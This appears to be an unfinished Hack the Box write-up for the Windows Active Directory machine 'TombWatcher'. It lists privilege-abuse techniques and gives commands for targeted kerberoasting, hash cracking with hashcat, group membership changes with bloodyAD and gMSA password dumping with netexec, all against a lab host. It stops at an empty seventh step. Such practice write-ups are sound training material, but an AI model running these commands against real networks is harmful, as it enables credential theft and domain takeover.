# TombWatcher

**Platform: Hack the Box**

**OS: Windows**

**Diffculty: Medium**


## Table of Contents
- [Key Learnings](#key-learnings)
- [Walkthrough](#walkthrough)
- [Remediation Summary](#remediation-summary)


## Key Learnings

- Familiarize myself with enumerating AD networks using Bloodhound
- Abuse GenericAll and ForceChangePassword privileges to change user passwords using *net rpc*
- Exploit GenericWrite privileges by running a targeted kerberoasting attack on vulnerable account
- Abuse DCSync privs to dump SAM and LSA hashes and compromise the Domain Controller by passing the hash
- Use Hashcat to crack .psafe3 file


## **Disclaimer: Potential spoilers below**


## Walkthrough

1. Run nmap scan
![image](https://github.com/user-attachments/assets/38c052d5-4737-4dd6-a5ab-eddd228b28da)

2. With Henry's credentials, enumerate network using Bloodhound. Found high-level path to machine
![image](https://github.com/user-attachments/assets/acff890c-ed2b-45b7-a016-f0f7f93aebef)

3. With Henry's credentials, do a targeted kerberoast attack on Alfred
`targetedKerberoast.py -v -d tombwatcher.htb -u henry -p H3nry_987TGV!`

4. We crack the hash using hashcat and we get Alfred's password: basketball
`hashcat -m 13100 hash.txt /usr/share/wordlist/rockyou.txt`
![image](https://github.com/user-attachments/assets/60b15e59-d3fe-4e3a-b44e-e668b79b5e84)

5. Add Alfred to Infrastructure group using BloodyAD
`sudo python3 /opt/bloodyAD/bloodyAD.py --host 10.129.47.3 -d TOMBWATCHER.HTB -u ALFRED -p basketball add groupMember INFRASTRUCTURE ALFRED`

6. Get GMSA password using netexec
`nxc ldap 10.129.47.3 -u alfred -p basketball --gmsa`


7. 



